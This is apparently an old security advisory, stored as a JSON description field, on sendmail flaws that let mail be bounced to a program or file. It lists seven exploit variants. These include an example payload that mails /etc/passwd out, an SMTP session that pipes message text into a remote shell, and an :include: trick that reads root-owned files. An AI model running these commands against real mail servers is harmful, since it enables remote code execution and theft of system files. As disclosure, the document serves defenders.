  "Description": "The sendmail problem is an old problem that is either back with us or\nmore likely never fully went away. \n\nIt is the problem where you can send mail that appears to be \"from\"\na program, to a non-existant user (or file or something else that will\ncause an error).  Sendmail wants to reply to the user who sent the mail\nto let them know about the error, and ends up running the program specified\nin the \"from\" field.  Most sendmail.cf's are configured with \"daemon\"\n(uid 1) as the user-id that runs the program rather than root,\nbut it is bad enough.  It means that a remote user can run arbitrary\nprograms on your machine.  If there are programs owned by deamon that\nare ever run as root or other users, then those accounts can be\ncompromised, obviously.\n\nWhen we distributed the 93:15 advisory, we believed the sendmail bug only\naffected Suns.  We have learned that's wrong and that the problem is more\nwidespread than we realized.  One complication is that there are different\nthemes on the same problem and some sendmails are vulnerable to some\nvariations but not others.\n\nHere is a description of the variations that have been problems in\none implementation or another.\n\n1) \"From:\" field is a program (e.g. \"|mail me < /etc/passwd\"), \"To:\"\n        field is a user that does not exist.\n\n2) Same as above but with a \"To:\" field pointing to a file.  (This works\n        on some systems that #1 fails on.)  Sendmail may issue an error\n        message, but the vulnerability works anyway.\n\n3) Same as #1 and #2, but only from the localhost.  That is, remote users\n        cannot exploit the problem, only local users via \"telnet localhost 25\".\n        This limits the impact to local users being able to access the\n        \"daemon\" account.\n\n4) Similar to above but with a \"Return-Receipt\" field that is incorrect\n        and an \"Errors-To\" field that is a program.  Although the\n        Return-Receipt field is checked, the Errors-To field is not.\n\n5) Same as above but instead of sending to localhost, the mail is sent to\n        [127.0.0.2] so that it is queued.  When the mail is eventually\n        timed out, a mail reply is generated and sent to the bogus From field.\n\n6) This version is exploited by the program posted to Firewalls by\n        Scott Chasin.\n\n                helo\n                mail from: |\n                rcpt to: bounce\n                data\n                .\n                (wait for a few seconds)\n                mail from: bin           (or other user except root)\n                rcpt to: | sed '1,/^$/d' | sh\n                data\n        and now the rest of the mail will be given as input to a \"sh\"\n        running on the target system.\n\n7) If sendmail uses the R option (\"OR\" in sendmail.cf) as \"Route on\n        NFS mounted spool directory\" as in SunOS, and this option is\n        used, then mail to files is allowed:\n\n                mail from:bin\n                rcpt to:/tmp/junk\n                data\n        and /tmp/junk is created owned by bin.\n\nAll the problems above mailing to programs is quite possibly a problem\nwith mailing to files as well.  This is a particular problem since\nit is not possible to work around this such as you can for mail to\nprograms by replacing the Mprog program with something like\nEric Allman's \"smrsh\".\n\nAlong with this \"From\" bug, a number of vendors are vulnerable\nto another bug.  There doesn't seem to be any good correlation between\nwho has one, both, or neither bug.  In this case, if a user puts\na \":include:/secret/file\" in her .forward file, and runs sendmail in\ndebug mode to test the aliases via \"/usr/lib/sendmail -v -bv $USER\",\nsendmail will open /secret/file as root and print the contents\nembedded in error messages along the lines of \"XXX: not a legal alias\", etc.\n\nAll of the above bugs are fixed, to the best of our knowledge,\nin Eric Allman's sendmail 8.6.4 which is available via anonymous\nFTP from ftp.cs.berkeley.edu:/ucb/sendmail.",
